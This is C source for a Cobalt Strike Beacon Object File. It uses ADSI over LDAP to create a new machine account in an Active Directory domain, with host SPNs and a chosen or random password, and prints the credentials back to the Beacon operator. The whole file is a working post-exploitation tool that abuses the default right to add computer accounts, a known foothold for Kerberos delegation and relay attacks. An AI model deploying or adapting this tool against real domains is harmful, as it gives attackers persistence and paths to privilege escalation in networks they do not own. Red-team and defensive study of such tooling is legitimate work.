#include <windows.h>
#include <activeds.h>
#include <dsgetdc.h>
#include <lm.h>

#include "AddMachineAccount.h"
#include "beacon.h"

#define BUF_SMALL 128
#define BUF_LARGE 256
#define MAX_SPNS 4


void GenRandomStringW(LPWSTR lpFileName, INT len) {
	static const wchar_t AlphaNum[] =
		L"0123456789"
		L"ABCDEFGHIJKLMNOPQRSTUVWXYZ"
		L"abcdefghijklmnopqrstuvwxyz";
	MSVCRT$srand(KERNEL32$GetTickCount());
	for (INT i = 0; i < len; ++i) {
		lpFileName[i] = AlphaNum[MSVCRT$rand() % (_countof(AlphaNum) - 1)];
	}
	lpFileName[len] = 0;
}

void GetFormattedErrMsg(_In_ HRESULT hr) {
	LPWSTR lpwErrorMsg = NULL;

	KERNEL32$FormatMessageW(FORMAT_MESSAGE_FROM_SYSTEM | FORMAT_MESSAGE_ALLOCATE_BUFFER | FORMAT_MESSAGE_IGNORE_INSERTS,  
	NULL,
	(DWORD)hr,
	MAKELANGID(LANG_NEUTRAL, SUBLANG_DEFAULT),
	(LPWSTR)&lpwErrorMsg,
	0,
	NULL);

	if (lpwErrorMsg != NULL) {
		BeaconPrintf(CALLBACK_ERROR, "HRESULT 0x%08lx: %ls", hr, lpwErrorMsg);
		KERNEL32$LocalFree(lpwErrorMsg);
	}
	else {
		BeaconPrintf(CALLBACK_ERROR, "HRESULT 0x%08lx", hr);
	}

	return;
}

HRESULT CreateMachineAccount(_In_ LPCWSTR lpwComputername, _In_ LPCWSTR lpwPassword) {
	HRESULT hr = S_FALSE;
	HINSTANCE hModule = NULL;
	IADs* pRoot = NULL;
	IDirectoryObject* pDirectoryObj = NULL;
	PDOMAIN_CONTROLLER_INFOW pdcInfo;
	ADS_ATTR_INFO rgAttrInfo[6];
	IDispatch* pIDispatch = NULL;
	IID IADsIID, IDirectoryObjectIID;
	VARIANT var;

	WCHAR wcPathName[BUF_LARGE];
	WCHAR wcCommonName[BUF_SMALL];
	WCHAR wcDnsHostName[BUF_SMALL];
	WCHAR wcSamAccountName[BUF_SMALL];
	WCHAR wcServicePrincipalName[MAX_SPNS][BUF_SMALL];
	WCHAR wcUnicodePasswd[BUF_SMALL];

	hModule = LoadLibraryA("Activeds.dll");
	_ADsOpenObject ADsOpenObject = (_ADsOpenObject)
		GetProcAddress(hModule, "ADsOpenObject");
	if (ADsOpenObject == NULL) {
		return hr;
	}

	DWORD dwRet = NETAPI32$DsGetDcNameW(NULL, NULL, NULL, NULL, 0, &pdcInfo);
	if (dwRet != ERROR_SUCCESS) {
		BeaconPrintf(CALLBACK_ERROR, "Failed to get domain/dns info.");
		goto CleanUp;
	}

	// Initialize COM.
	hr = OLE32$CoInitializeEx(NULL, COINIT_APARTMENTTHREADED);
	if (FAILED(hr)) {
		goto CleanUp;
	}

	// Resolve IID from GUID string.
	LPCOLESTR pIADsIID = L"{FD8256D0-FD15-11CE-ABC4-02608C9E7553}";
	LPCOLESTR pIDirectoryObjectIID = L"{E798DE2C-22E4-11D0-84FE-00C04FD8D503}";

	hr = OLE32$IIDFromString(pIADsIID, &IADsIID);
	hr = OLE32$IIDFromString(pIDirectoryObjectIID, &IDirectoryObjectIID);

	// Get rootDSE and the current user's domain container DN.
	hr = ADsOpenObject(L"LDAP://rootDSE",
		NULL,
		NULL,
		ADS_USE_SEALING | ADS_USE_SIGNING | ADS_SECURE_AUTHENTICATION, // Use Kerberos encryption
		&IADsIID,
		(void**)&pRoot);
	if (FAILED(hr)) {
		BeaconPrintf(CALLBACK_ERROR, "Failed to get rootDSE.");
		goto CleanUp;
	}

	OLEAUT32$VariantInit(&var);
	hr = pRoot->lpVtbl->Get(pRoot, (BSTR)L"defaultNamingContext", &var);
	if (FAILED(hr)) {
		BeaconPrintf(CALLBACK_ERROR, "Failed to get defaultNamingContext.");
		goto CleanUp;
	}

	MSVCRT$memset(wcPathName, 0, sizeof(wcPathName));
	MSVCRT$wcscpy_s(wcPathName, _countof(wcPathName), L"LDAP://CN=Computers,");
	MSVCRT$wcscat_s(wcPathName, _countof(wcPathName), var.bstrVal);

	// Get Computer container object.
	hr = ADsOpenObject((LPCWSTR)wcPathName,
		NULL,
		NULL,
		ADS_USE_SEALING | ADS_USE_SIGNING | ADS_SECURE_AUTHENTICATION, // Use Kerberos encryption
		&IDirectoryObjectIID,
		(void**)&pDirectoryObj);
	if (FAILED(hr)) {
		BeaconPrintf(CALLBACK_ERROR, "ADsOpenObject failed.");
		goto CleanUp;
	}

	// Setup the objectClass property.
	ADSVALUE classValue;
	classValue.dwType = ADSTYPE_CASE_IGNORE_STRING;
	classValue.CaseIgnoreString = (LPWSTR)L"Computer";
	rgAttrInfo[0].pszAttrName = (LPWSTR)L"objectClass";
	rgAttrInfo[0].dwControlCode = ADS_ATTR_UPDATE;
	rgAttrInfo[0].dwADsType = ADSTYPE_CASE_IGNORE_STRING;
	rgAttrInfo[0].pADsValues = &classValue;
	rgAttrInfo[0].dwNumValues = 1;

	// Setup the sAMAccountName property.
	ADSVALUE sAMValue;
	MSVCRT$memset(wcSamAccountName, 0, sizeof(wcSamAccountName));
	MSVCRT$wcscpy_s(wcSamAccountName, _countof(wcSamAccountName), lpwComputername);
	MSVCRT$wcscat_s(wcSamAccountName, _countof(wcSamAccountName), L"$");

	sAMValue.dwType = ADSTYPE_CASE_IGNORE_STRING;
	sAMValue.CaseIgnoreString = (ADS_CASE_IGNORE_STRING)wcSamAccountName;
	rgAttrInfo[1].pszAttrName = (LPWSTR)L"sAMAccountName";
	rgAttrInfo[1].dwControlCode = ADS_ATTR_UPDATE;
	rgAttrInfo[1].dwADsType = ADSTYPE_CASE_IGNORE_STRING;
	rgAttrInfo[1].pADsValues = &sAMValue;
	rgAttrInfo[1].dwNumValues = 1;

	// Setup the userAccountControl property.
	ADSVALUE userAccountControlValue;
	userAccountControlValue.dwType = ADSTYPE_INTEGER;
	userAccountControlValue.Integer = ADS_UF_WORKSTATION_TRUST_ACCOUNT;
	rgAttrInfo[2].pszAttrName = (LPWSTR)L"userAccountControl";
	rgAttrInfo[2].dwControlCode = ADS_ATTR_UPDATE;
	rgAttrInfo[2].dwADsType = ADSTYPE_INTEGER;
	rgAttrInfo[2].pADsValues = &userAccountControlValue;
	rgAttrInfo[2].dwNumValues = 1;

	// Setup the dNSHostName property.
	ADSVALUE sDNSValue;
	MSVCRT$memset(wcDnsHostName, 0, sizeof(wcDnsHostName));
	MSVCRT$wcscpy_s(wcDnsHostName, _countof(wcDnsHostName), lpwComputername);
	MSVCRT$wcscat_s(wcDnsHostName, _countof(wcDnsHostName), L".");
	MSVCRT$wcscat_s(wcDnsHostName, _countof(wcDnsHostName), USER32$CharLowerW(pdcInfo->DomainName));

	sDNSValue.dwType = ADSTYPE_CASE_IGNORE_STRING;
	sDNSValue.CaseIgnoreString = (ADS_CASE_IGNORE_STRING)wcDnsHostName;
	rgAttrInfo[3].pszAttrName = (LPWSTR)L"dNSHostName";
	rgAttrInfo[3].dwControlCode = ADS_ATTR_UPDATE;
	rgAttrInfo[3].dwADsType = ADSTYPE_CASE_IGNORE_STRING;
	rgAttrInfo[3].pADsValues = &sDNSValue;
	rgAttrInfo[3].dwNumValues = 1;

	// Setup the servicePrincipalName property.
	ADSVALUE sSPNValue[4];
	MSVCRT$memset(wcServicePrincipalName, 0, sizeof(wcServicePrincipalName));
	MSVCRT$wcscpy_s(wcServicePrincipalName[0], _countof(wcServicePrincipalName[1]), L"HOST/");
	MSVCRT$wcscat_s(wcServicePrincipalName[0], _countof(wcServicePrincipalName[1]), wcDnsHostName);
	MSVCRT$wcscpy_s(wcServicePrincipalName[1], _countof(wcServicePrincipalName[1]), L"RestrictedKrbHost/");
	MSVCRT$wcscat_s(wcServicePrincipalName[1], _countof(wcServicePrincipalName[1]), wcDnsHostName);
	MSVCRT$wcscpy_s(wcServicePrincipalName[2], _countof(wcServicePrincipalName[2]), L"HOST/");
	MSVCRT$wcscat_s(wcServicePrincipalName[2], _countof(wcServicePrincipalName[2]), lpwComputername);
	MSVCRT$wcscpy_s(wcServicePrincipalName[3], _countof(wcServicePrincipalName[3]), L"RestrictedKrbHost/");
	MSVCRT$wcscat_s(wcServicePrincipalName[3], _countof(wcServicePrincipalName[3]), lpwComputername);

	sSPNValue[0].dwType = ADSTYPE_CASE_IGNORE_STRING;
	sSPNValue[0].CaseIgnoreString = (ADS_CASE_IGNORE_STRING)wcServicePrincipalName[0];
	sSPNValue[1].dwType = ADSTYPE_CASE_IGNORE_STRING;
	sSPNValue[1].CaseIgnoreString = (ADS_CASE_IGNORE_STRING)wcServicePrincipalName[1];
	sSPNValue[2].dwType = ADSTYPE_CASE_IGNORE_STRING;
	sSPNValue[2].CaseIgnoreString = (ADS_CASE_IGNORE_STRING)wcServicePrincipalName[2];
	sSPNValue[3].dwType = ADSTYPE_CASE_IGNORE_STRING;
	sSPNValue[3].CaseIgnoreString = (ADS_CASE_IGNORE_STRING)wcServicePrincipalName[3];
	rgAttrInfo[4].pszAttrName = (LPWSTR)L"servicePrincipalName";
	rgAttrInfo[4].dwControlCode = ADS_ATTR_UPDATE;
	rgAttrInfo[4].dwADsType = ADSTYPE_CASE_IGNORE_STRING;
	rgAttrInfo[4].pADsValues = sSPNValue;
	rgAttrInfo[4].dwNumValues = 4;

	// Setup the unicodePwd property.
	ADSVALUE sUnicodePwdValue;
	MSVCRT$memset(wcUnicodePasswd, 0, sizeof(wcUnicodePasswd));
	if (lpwPassword == NULL) { // Generate random password
		MSVCRT$wcscpy_s(wcUnicodePasswd, _countof(wcUnicodePasswd), L"\"");
		GenRandomStringW(wcUnicodePasswd + 1, 32);
		MSVCRT$wcscat_s(wcUnicodePasswd, _countof(wcUnicodePasswd), L"\"");
	}
	else {
		MSVCRT$wcscpy_s(wcUnicodePasswd, _countof(wcUnicodePasswd), L"\"");
		MSVCRT$wcscat_s(wcUnicodePasswd, _countof(wcUnicodePasswd), lpwPassword);
		MSVCRT$wcscat_s(wcUnicodePasswd, _countof(wcUnicodePasswd), L"\"");
	}

	sUnicodePwdValue.dwType = ADSTYPE_OCTET_STRING;
	sUnicodePwdValue.OctetString.dwLength = (DWORD)MSVCRT$wcslen(wcUnicodePasswd) * sizeof(WCHAR);
	sUnicodePwdValue.OctetString.lpValue = (LPBYTE)wcUnicodePasswd;
	rgAttrInfo[5].pszAttrName = (LPWSTR)L"unicodePwd";
	rgAttrInfo[5].dwControlCode = ADS_ATTR_UPDATE;
	rgAttrInfo[5].pADsValues = &sUnicodePwdValue;
	rgAttrInfo[5].dwNumValues = 1;

	// Create the object in the Computer container with the specified property values.
	MSVCRT$memset(wcCommonName, 0, sizeof(wcCommonName));
	MSVCRT$wcscpy_s(wcCommonName, _countof(wcCommonName), L"CN=");
	MSVCRT$wcscat_s(wcCommonName, _countof(wcCommonName), lpwComputername);

	hr = pDirectoryObj->lpVtbl->CreateDSObject(pDirectoryObj,
		wcCommonName,
		rgAttrInfo,
		sizeof(rgAttrInfo) / sizeof(ADS_ATTR_INFO),
		&pIDispatch
	);
	if (FAILED(hr)) {
		BeaconPrintf(CALLBACK_ERROR, "Failed to create Computer object.");
		goto CleanUp;
	}

	BeaconPrintf(CALLBACK_OUTPUT, "[+] Machine account %ls$ created with password: %ls \n", lpwComputername, wcUnicodePasswd);

CleanUp:

	if (pdcInfo != NULL) {
		NETAPI32$NetApiBufferFree(pdcInfo);
	}

	if (pIDispatch != NULL) {
		pIDispatch->lpVtbl->Release(pIDispatch);
		pIDispatch = NULL;
	}

	if (pDirectoryObj != NULL) {
		pDirectoryObj->lpVtbl->Release(pDirectoryObj);
		pDirectoryObj = NULL;
	}

	if(pRoot != NULL){
		pRoot->lpVtbl->Release(pRoot);
		pRoot = NULL;
	}

	OLE32$CoUninitialize();

	return hr;
}

VOID go(IN PCHAR Args, IN ULONG Length) {
	HRESULT hr = S_OK;
	LPCWSTR lpwComputername = NULL;
	LPCWSTR lpwPassword = NULL;

	// Parse Arguments
	datap parser;
	BeaconDataParse(&parser, Args, Length);
	
	lpwComputername = (WCHAR*)BeaconDataExtract(&parser, NULL);
	lpwPassword = (WCHAR*)BeaconDataExtract(&parser, NULL);

	hr = CreateMachineAccount(USER32$CharUpperW((LPWSTR)lpwComputername), lpwPassword);
	if (FAILED(hr)) {
		GetFormattedErrMsg(hr);
	}

	return;
}
